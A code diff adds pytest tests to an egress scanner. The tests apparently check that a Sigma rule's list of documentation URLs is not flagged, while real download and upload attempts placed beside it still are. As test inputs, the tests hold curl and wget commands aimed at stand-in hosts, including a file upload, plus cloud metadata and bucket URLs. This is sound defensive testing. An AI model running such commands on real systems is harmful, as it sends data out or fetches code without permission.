@@ -341,6 +341,64 @@ def test_prose_that_mentions_a_command_is_not_a_finding():
     ]
 
 
+SIGMA = (
+    "title: Curl download into a temp directory\n"
+    "status: experimental\n"
+    "description: A process that downloads a file with curl.\n"
+    "references:\n"
+    "  - https://attack.mitre.org/techniques/T1105/\n"
+    "  - 'https://example.com/writeup'\n"
+    "tags:\n"
+    "  - attack.command_and_control\n"
+    "detection:\n"
+    "  selection:\n"
+    "    Image|endswith: /curl\n"
+    "  condition: selection\n"
+)
+
+
+def test_a_sigma_references_list_of_documentation_urls_is_not_egress():
+    assert canary.raw_findings(SIGMA, TASK) == []
+    assert canary.raw_findings("```yaml\n" + SIGMA + "```\n", TASK) == []
+    assert run_replies(TASK, SIGMA)["findings"] == []
+
+
+@pytest.mark.parametrize(
+    "attempt",
+    [
+        "curl https://attack.mitre.org/techniques/T1105/ -o /tmp/x",  # the same host, run
+        "wget https://evil.example/x",
+        "$ curl -T f https://lab.example/up",
+    ],
+)
+def test_a_real_egress_attempt_still_fails_beside_a_references_list(attempt):
+    for text in (
+        SIGMA + "\nTo test it:\n```bash\n" + attempt + "\n```\n",
+        "```bash\n" + attempt + "\n```\n\n" + SIGMA,
+        SIGMA + attempt + "\n",
+    ):
+        found = canary.raw_findings(text, TASK)
+        assert any(f.startswith("off-allowlist") for f in found), (attempt, found)
+
+
+def test_only_a_references_list_of_bare_urls_is_exempt():
+    # not in a references list, in a shell block, nested, or carrying a command: still scanned
+    for text in (
+        "description: see https://attack.mitre.org/techniques/T1105/\n",
+        "```bash\nreferences:\n  - https://attack.mitre.org/x\n```\n",
+        "detection:\n  references:\n    - https://attack.mitre.org/x\n",
+        "references:\n  - curl https://attack.mitre.org/x\n",
+        "tags:\n  - https://attack.mitre.org/x\n",
+    ):
+        assert any(f.startswith("off-allowlist") for f in canary.raw_findings(text, TASK)), text
+
+
+def test_a_references_url_that_is_a_security_finding_still_fails():
+    for url in (f"http://{MD}/latest", "https://bucket.s3.amazonaws.com/x", "http://192.0.2.7/x"):
+        found = canary.raw_findings(f"references:\n  - {url}\n", TASK)
+        assert found, url
+
+
 def test_a_clean_answer_is_not_scanned():
     assert run_replies(TASK, '{"answer": "' + PUT_META + '"}')["findings"] == []
 
